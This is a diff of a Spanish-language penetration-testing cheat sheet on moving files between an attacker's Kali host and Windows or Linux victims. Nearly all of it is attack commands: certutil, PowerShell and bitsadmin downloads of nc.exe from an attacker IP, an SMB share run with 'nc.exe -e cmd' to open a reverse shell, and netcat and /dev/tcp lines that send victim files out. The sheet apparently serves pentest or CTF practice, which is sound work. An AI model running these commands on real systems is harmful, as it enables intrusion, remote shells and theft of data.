@@ -49,36 +49,38 @@ C:\Users\Public
 
 4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
    # Con credenciales → cuando Windows bloquea conexiones SMB anónimas
-   # En Windows: net use \\IP\smbFolder /u:omar omar123
 
-5. ❯ php -S 0.0.0.0:80
+
+EXTRA:
+   ❯ php -S 0.0.0.0:80
    # Servidor HTTP con PHP → alternativa a Python
 ```
 
 ### Víctima Windows — Descargar desde Linux
 
 ```bash
-1. ❯ upload ~/Downloads/file.exe
-   # Solo en sesión Meterpreter → ruta absoluta del archivo en Kali
-
-2. ❯ certutil -urlcache -f http://<IP>/nc.exe nc.exe
-   ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe nc.exe
-   # Certutil → siempre disponible en Windows → muy fiable
-
-3. ❯ powershell -c "Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe"
+1  ❯ powershell -c "Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe"
    ❯ powershell -c "IWR http://<IP>/nc.exe -OutFile nc.exe"
    ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','nc.exe')"
    # PowerShell → varias alternativas si una falla
 
-4. ❯ copy \\<IP>\smbFolder\File.exe File.exe
+2  ❯ certutil -urlcache -f http://<IP>/nc.exe nc.exe
+   ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe nc.exe
+   # Certutil → siempre disponible en Windows → muy fiable
+
+3 ❯ copy \\<IP>\smbFolder\File.exe File.exe
    # Copiar archivo desde SMB de Kali a Windows
    ❯ \\<IP>\smbFolder\nc.exe -e cmd <IP> 443
    # Ejecutar directamente desde el SMB sin copiar al disco
 
-5. ❯ bitsadmin /transfer job http://<IP>/nc.exe C:\Temp\nc.exe
+4 ❯ net use \\IP\smbFolder /u:omar omar123
+   # En Windows colocar las credenciales para hacer la transferencia
+
+EXTRA:
+   ❯ bitsadmin /transfer job http://<IP>/nc.exe C:\Temp\nc.exe
    # BITS → descarga en segundo plano → a veces evita restricciones
 
-6. ❯ certutil -decode input.b64 output.exe
+   ❯ certutil -decode input.b64 output.exe
    # Decodificar archivo base64 → útil cuando solo puedes copiar texto
 ```
 
@@ -92,8 +94,8 @@ C:\Users\Public
 1. ❯ python3 -m http.server 80
    # Servidor HTTP → método más común
 
-2. ❯ nc -nlvp 443 > file_recibido.zip
-   # Recibir archivo de la víctima vía netcat
+2. ❯ python -m SimpleHTTPServer 80
+   # Python 2 → alternativa si python3 no está disponible
 
 3. ❯ base64 -w 0 script.sh | xclip -sel clip
    # Copiar script en base64 al portapapeles
@@ -121,10 +123,11 @@ C:\Users\Public
 4. ❯ nc <IP_KALI> 443 < File.zip
    # Enviar archivo a Kali vía netcat
 
-5. ❯ cat < file.txt > /dev/tcp/<IP_KALI>/443
+EXTRA: 
+   ❯ cat < file.txt > /dev/tcp/<IP_KALI>/443
    # Enviar archivo usando /dev/tcp → sin netcat
 
-6. ❯ scp file.txt user@<IP_KALI>:/tmp/
+   ❯ scp file.txt user@<IP_KALI>:/tmp/
    # SCP → requiere SSH en Kali y credenciales
 ```
 
